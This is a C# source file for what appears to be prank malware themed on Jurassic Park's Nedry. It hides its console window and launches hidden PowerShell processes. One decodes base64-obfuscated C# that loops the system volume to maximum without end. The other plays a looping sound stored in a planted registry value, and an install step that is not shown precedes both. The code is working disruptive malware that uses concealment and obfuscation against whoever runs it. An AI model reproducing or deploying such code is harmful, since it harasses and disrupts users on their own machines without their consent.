using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Payload
{
    internal class Program
    {
        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("Kernel32")]
        private static extern IntPtr GetConsoleWindow();

        static void Main()
        {
            Console.Title = "";
            //Console.WriteLine("Payload runnung!");
            Nedry.Install();
            Payload();
        }

        static void Payload()
        {
            ShowWindow(GetConsoleWindow(), SW_HIDE);

            // C# class that gets compiled and executed to run and infinite loop that turns up the system volume to max.
            ProcessStartInfo volumeMaxxer = new ProcessStartInfo();
            volumeMaxxer.UseShellExecute = true;
            //volumeMaxxer.CreateNoWindow = true;
            volumeMaxxer.FileName = "powershell.exe";
            volumeMaxxer.Arguments = "powershell.exe -NoExit -c $base64CSharpCode = 'dXNpbmcgU3lzdGVtOw0KdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOw0KdXNpbmcgU3lzdGVtLlRocmVhZGluZzsNCnB1YmxpYyBjbGFzcyBWb2x1bWUNCnsNCiAgICBbRGxsSW1wb3J0KCJLZXJuZWwzMiIpXQ0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBJbnRQdHIgR2V0Q29uc29sZVdpbmRvdygpOw0KICAgIHByaXZhdGUgY29uc3QgaW50IEFQUENPTU1BTkRfVk9MVU1FX1VQID0gMHhBMDAwMDsNCiAgICBwcml2YXRlIGNvbnN0IGludCBXTV9BUFBDT01NQU5EID0gMHgzMTk7DQogICAgW0RsbEltcG9ydCgidXNlcjMyLmRsbCIpXQ0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBTZW5kTWVzc2FnZVcoSW50UHRyIGhXbmQsIGludCBNc2csIEludFB0ciB3UGFyYW0sIEludFB0ciBsUGFyYW0pOw0KICAgIHB1YmxpYyBzdGF0aWMgdm9pZCBWb2xVcCgpDQogICAgew0KICAgICAgICBTZW5kTWVzc2FnZVcoR2V0Q29uc29sZVdpbmRvdygpLCBXTV9BUFBDT01NQU5ELCBHZXRDb25zb2xlV2luZG93KCksIChJbnRQdHIpQVBQQ09NTUFORF9WT0xVTUVfVVApOw0KICAgIH0NCiAgICBwdWJsaWMgc3RhdGljIHZvaWQgTWF4KCkNCiAgICB7DQogICAgICAgIHdoaWxlICh0cnVlKQ0KICAgICAgICB7DQogICAgICAgICAgICBWb2xVcCgpOw0KICAgICAgICAgICAgVGhyZWFkLlNsZWVwKDEwKTsNCiAgICAgICAgfQ0KICAgIH0NCn0=';$decodedCSharpCode = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64CSharpCode));Add-Type -TypeDefinition $decodedCSharpCode -Language CSharp;[Volume]::Max()";
            volumeMaxxer.WindowStyle = ProcessWindowStyle.Hidden;
            Process.Start(volumeMaxxer);



            // Powershell command to run nedry (only once globally)
            ProcessStartInfo inf = new ProcessStartInfo();
            inf.UseShellExecute = false;
            inf.CreateNoWindow = true;
            inf.FileName = "powershell.exe";
            inf.Arguments = @"-NoExit -c $createdNew = $false;[System.Threading.Mutex]::new($true, 'RR555667', [ref]$createdNew); if ($createdNew) { (New-Object Media.SoundPlayer ([System.IO.MemoryStream]::new([System.Convert]::FromBase64String((Get-ItemPropertyValue -Path 'Registry::HKEY_CURRENT_USER\Software\Microsoft\Command Processor' -Name 'NedryBullshit'))))).PlayLooping(); } else { Stop-Process -Id $PID -Force; }";
            inf.WindowStyle = ProcessWindowStyle.Hidden;
            Process.Start(inf);
        }
    }
}
